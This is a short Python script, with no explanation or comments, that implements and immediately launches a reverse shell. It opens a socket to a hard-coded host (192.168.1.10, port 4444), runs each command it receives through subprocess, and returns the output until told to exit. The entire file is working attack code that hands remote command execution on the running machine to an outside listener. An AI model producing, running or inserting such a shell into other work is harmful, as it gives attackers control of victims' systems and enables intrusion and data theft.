import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

host = "192.168.1.10"
port = 4444
reverse_shell(host, port)
